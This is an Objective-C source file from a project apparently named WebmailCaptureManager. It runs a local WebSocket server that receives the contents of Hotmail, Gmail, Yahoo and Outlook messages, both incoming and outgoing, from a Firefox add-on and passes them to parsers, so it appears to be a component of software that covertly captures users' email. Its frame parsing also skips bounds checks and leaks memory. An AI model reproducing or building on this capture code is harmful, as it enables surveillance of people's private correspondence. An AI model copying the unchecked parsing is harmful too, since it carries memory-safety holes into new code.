//
//  AsyncController.m
//  WebmailCaptureManager
//
//  Created by ophat on 4/23/15.
//  Copyright (c) 2015 ophat. All rights reserved.
//

#import "AsyncController.h"
#import "AsyncSocket.h"

#import "WebmailHTMLParser.h"
#import "WebmailHTMLParser+Outlook.h"

#import <CommonCrypto/CommonDigest.h>

#define kMSG 1

#define READ_TIMEOUT 10.0
#define READ_TIMEOUT_EXTENSION 10.0

#define kPORT 8888

#define FORMAT(format, ...) [NSString stringWithFormat:(format), ##__VA_ARGS__]

@implementation AsyncController
@synthesize mMyKey;

- (id)init{
    if((self = [super init])){
        listenSocket = [[AsyncSocket alloc] initWithDelegate:self];
        connectedSockets = [[NSMutableArray alloc] initWithCapacity:1];
    }
    return self;
}
-(void)startServer{
    [listenSocket setRunLoopModes:[NSArray arrayWithObject:NSRunLoopCommonModes]];
    
    NSError *error = nil;
    if(![listenSocket acceptOnPort:kPORT error:&error]) {
        DLog(@"startServer error %@",error);
        return;
    }else{
        DLog(@"startServer No error");

    }
}

-(void)stopServer{
    [listenSocket disconnect];
    if ( [listenSocket isDisconnected]) {
        for(int i = 0; i < [connectedSockets count]; i++) {
            [[connectedSockets objectAtIndex:i] disconnect];
        }
        [connectedSockets removeAllObjects];
        DLog(@"connectedSockets %lu",(unsigned long)[connectedSockets count]);
    }else{
        DLog(@"isStillConnected");
    }
}

#pragma mark ###Delegate Method
- (void)onSocket:(AsyncSocket *)sock didAcceptNewSocket:(AsyncSocket *)newSocket{
    DLog(@"didAcceptNewSocket");
    [connectedSockets addObject:newSocket];
}

- (void)onSocket:(AsyncSocket *)sock didConnectToHost:(NSString *)host port:(UInt16)port{
     DLog(@"didConnectToHost");
    [sock readDataWithTimeout:-1 tag:kMSG];
}

- (void)onSocket:(AsyncSocket *)sock didWriteDataWithTag:(long)tag{
    if(tag == kMSG){
        [sock readDataWithTimeout:-1 tag:kMSG];
    }
}

- (void)onSocket:(AsyncSocket *)sock didReadData:(NSData *)data withTag:(long)tag{
    
    NSData *strData = data;
    NSString *msg = [[NSString alloc] initWithData:strData encoding:NSUTF8StringEncoding];
    
    if ([msg length]) {
        NSString * defaultKeyFirefox =@"258EAFA5-E914-47DA-95CA-C5AB0DC85B11";
        DLog(@"### Receive Header %@ ",msg);
        
        if ([msg rangeOfString:@"Sec-WebSocket-Key:"].location != NSNotFound) {
            NSArray * spliter = [msg componentsSeparatedByString:@"Sec-WebSocket-Key: "];
            spliter = [[spliter objectAtIndex:1] componentsSeparatedByString:@"="];
            if ([spliter objectAtIndex:0]>0) {
                self.mMyKey = [NSString stringWithFormat:@"%@==%@",[spliter objectAtIndex:0],defaultKeyFirefox];
                
                /*
                 //For Test ===> //result should be "s3pPLMBiTxaQ9kYGzzhZRbK+xOo=" refer to https://developer.mozilla.org/en-US/docs/WebSockets/Writing_WebSocket_servers
                 self.mMyKey  = [NSString stringWithFormat:@"dGhlIHNhbXBsZSBub25jZQ==%@",defaultKeyFirefox];
                 */
                
                self.mMyKey  = [self toBase64:[self toSHA1Hash: self.mMyKey]];
                
                NSString *RKey =[NSString stringWithFormat: @"HTTP/1.1 101 Switching Protocols\r\nUpgrade: websocket\r\nConnection: Upgrade\r\nSec-WebSocket-Accept: %@\r\n\r\n",self.mMyKey];
                DLog(@"RKEY %@",RKey);
                
                NSData * ResponseKeyData = [RKey dataUsingEncoding:NSUTF8StringEncoding];
                [sock writeData:ResponseKeyData withTimeout:-1 tag:kMSG];
            }
        }
    }else{
        DLog(@"### Receive Payload length %lu",(unsigned long)[strData length]);
        const char *byte = [strData bytes];
        char * bufEncodePage = nil;
        char key[4];
        int lenData = 0;
        int pointerBuf = 0;
        int bitFin = 0;
        
        NSString * text = @"";
        while (!bitFin){
            
            bitFin = ((byte[pointerBuf] & 128) == 128);
            int bitMask = ((byte[pointerBuf+1] & 128) == 128);
            int lenCode = byte[pointerBuf+1] & 127;
            if (lenCode == 126) {
                char byteDataLen[2];
                byteDataLen[0] = byte[pointerBuf+3];
                byteDataLen[1] = byte[pointerBuf+2];
                lenData = *(uint16*)byteDataLen;
                memcpy(key, byte + pointerBuf + 4, 4);
                bufEncodePage = malloc(lenData+1);
                memset(bufEncodePage, 0, lenData+1);
                memcpy(bufEncodePage, byte + pointerBuf + 8, lenData);
                pointerBuf += (8+lenData);
            }
            else if (lenCode == 127) {
                char byteDataLen[8];
                byteDataLen[0] = byte[pointerBuf+9];
                byteDataLen[1] = byte[pointerBuf+8];
                byteDataLen[2] = byte[pointerBuf+7];
                byteDataLen[3] = byte[pointerBuf+6];
                byteDataLen[4] = byte[pointerBuf+5];
                byteDataLen[5] = byte[pointerBuf+4];
                byteDataLen[6] = byte[pointerBuf+3];
                byteDataLen[7] = byte[pointerBuf+2];
                lenData = *(uint32*)byteDataLen;
                memcpy(key, byte + pointerBuf + 10, 4);
                bufEncodePage = malloc(lenData+1);
                memset(bufEncodePage, 0, lenData+1);
                memcpy(bufEncodePage, byte + pointerBuf + 14, lenData);
                pointerBuf += (14+lenData);
            }
            else {
                lenData = lenCode;
                memcpy(key, byte + pointerBuf + 2, 4);
                bufEncodePage = malloc(lenData+1);
                memset(bufEncodePage, 0, lenData+1);
                memcpy(bufEncodePage, byte + pointerBuf + 6, lenData);
                pointerBuf += (6+lenData);
            }
            
            if (bufEncodePage) {
                if (bitMask) {
                    for (long i = 0; i < lenData; i++) {
                        bufEncodePage[i] = bufEncodePage[i] ^ key[i%4];
                    }
                    NSData* data = [NSData dataWithBytes:bufEncodePage length:lenData];
                    NSString *str = [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding];
                    text = [NSString stringWithFormat:@"%@%@",text,str];
                    [str release];
                    bufEncodePage = nil;
                }
            }
        }
        bufEncodePage = nil;
        [self ConstructInfo:text];
    }
    [msg release];
}

- (NSTimeInterval)onSocket:(AsyncSocket *)sock shouldTimeoutReadWithTag:(long)tag elapsed:(NSTimeInterval)elapsed bytesDone:(NSUInteger)length {
    if(elapsed <= READ_TIMEOUT) {
        return READ_TIMEOUT_EXTENSION;
    }
    return 0.0;
}

- (void)onSocket:(AsyncSocket *)sock willDisconnectWithError:(NSError *)err {
    
}

- (void)onSocketDidDisconnect:(AsyncSocket *)sock{
    [connectedSockets removeObject:sock];
}
#pragma mark ## ChecksSource
-(void)ConstructInfo:(NSString *)aSource{
    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
        @try {
            DLog(@"Socket callback from Firefox : %@", aSource);
            if ([aSource rangeOfString:@"F::=>INHOTMAIL"].location != NSNotFound) {
                [WebmailHTMLParser Firefox_HTMLParser:aSource withDirection:0 from:@"HOTMAIL"];
            } else if ([aSource rangeOfString:@"F::=>OUTHOTMAIL"].location != NSNotFound){
                [WebmailHTMLParser Firefox_HTMLParser:aSource withDirection:1 from:@"HOTMAIL"];
            } else if ([aSource rangeOfString:@"F::=>INGMAIL"].location != NSNotFound) {
                [WebmailHTMLParser Firefox_HTMLParser:aSource withDirection:0 from:@"GMAIL"];
            } else if ([aSource rangeOfString:@"F::=>OUTGMAIL"].location != NSNotFound) {
                [WebmailHTMLParser Firefox_HTMLParser:aSource withDirection:1 from:@"GMAIL"];
            } else if ([aSource rangeOfString:@"F::=>INYAHOO"].location != NSNotFound) {
                [WebmailHTMLParser Firefox_HTMLParser:aSource withDirection:0 from:@"YAHOO"];
            } else if ([aSource rangeOfString:@"F::=>OUTYAHOO"].location != NSNotFound) {
                [WebmailHTMLParser Firefox_HTMLParser:aSource withDirection:1 from:@"YAHOO"];
            } else if ([aSource rangeOfString:@"F::=>OUTOUTLOOK"].location != NSNotFound) {
                NSString *json = [aSource stringByReplacingOccurrencesOfString:@"F::=>OUTOUTLOOK" withString:@""];
                [WebmailHTMLParser parseOutlook_OutgoingJSON:json];
            } else if ([aSource rangeOfString:@"F::=>INOUTLOOK"].location != NSNotFound) {
                NSString *json = [aSource stringByReplacingOccurrencesOfString:@"F::=>INOUTLOOK" withString:@""];
                [WebmailHTMLParser parseOutlook_IncomingJSON:json];
            }
        } @catch (NSException *exception) {
            DLog(@"Parse data from Firefox addon exception : %@", exception);
        } @finally {
            ;
        }
    });
}
#pragma mark ## GenerateSecurityKey

- (NSData *)toSHA1Hash:(NSString *)aKey{
    NSData *data = [aKey dataUsingEncoding:NSUTF8StringEncoding];
    NSString *stringData = [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding];
    data = [stringData dataUsingEncoding:NSUTF8StringEncoding];
    unsigned char hash[CC_SHA1_DIGEST_LENGTH];
    CC_SHA1([data bytes], (unsigned int)[data length], hash);
    NSData *result = [NSData dataWithBytes:hash length:CC_SHA1_DIGEST_LENGTH];
    [stringData release];
    DLog(@"### SHA1 Hash => %@",result);
    return result;
}

-(NSString * )toBase64:(NSData *)aData{
    NSString *base64Encoded = [aData base64EncodedStringWithOptions:0];
    DLog(@"### Base64Encoded => %@",base64Encoded);
    return base64Encoded;
}

/*
 #pragma mark ## XOR Decryption
 
 -(NSString *)XORDecryption:(NSString *)aBuffer withKey:(NSString *)aKey{
 NSAutoreleasePool * pool = [[NSAutoreleasePool alloc]init];
 const char *buff = [aBuffer UTF8String];
 const char *key = [aKey UTF8String];
 int decode;
 NSString * keeper =@"";
 for (int i=0; i < (int)[aBuffer length]; i++) {
 int a = buff[i] - '0';
 int b = key[i] - '0';
 decode = a ^ b;
 keeper = [NSString stringWithFormat:@"%@%d",keeper,decode];
 }
 [pool release];
 return keeper;
 }
 
 #pragma mark ## BinaryToText
 
 -(NSString*) BinaryToText:(NSString*)aBinString {
 //DLog(@"BinaryToText");
 NSArray *tokens = [aBinString componentsSeparatedByString:@" "];
 char *chars = malloc(sizeof(char) * ([tokens count] + 1));
 for (int i = 0; i < (int) [tokens count]; i++) {
 const char *token_c = [[tokens objectAtIndex:i] cStringUsingEncoding:NSUTF8StringEncoding];
 char val = (char)strtol(token_c, NULL, 2);
 chars[i] = val;
 }
 chars[[tokens count]] = 0;
 NSString *result = [NSString stringWithCString:chars encoding:NSUTF8StringEncoding];
 free(chars);
 return result;
 }
 
 #pragma mark ## BinaryToDecimal
 
 -(long)BinaryToDecimal:(NSString *)aBinary{
 long v = strtol([aBinary UTF8String], NULL, 2);
 return v;
 }
 
 - (int )BinaryStringToDecimal:(NSString *)binaryString {
 int totalValue = 0;
 for (int i = 0; i < (int)[binaryString length]; i++) {
 totalValue += (int)([binaryString characterAtIndex:(binaryString.length - 1 - i)] - 48) * pow(2, i);
 }
 return totalValue;
 }
 
 #pragma mark ## DecimalToBinary
 
 -(NSString *)DecimalToBinary:(NSUInteger)decInt{
 NSString *string = @"" ;
 NSUInteger x = decInt;
 int i = 0;
 while (x>0) {
 string = [[NSString stringWithFormat: @"%lu", x&1] stringByAppendingString:string];
 x = x >> 1;
 ++i;
 }
 return string;
 }
 */

- (void) dealloc {
    [mMyKey release];
    [connectedSockets release];
    [listenSocket release];
    [super dealloc];
}

@end
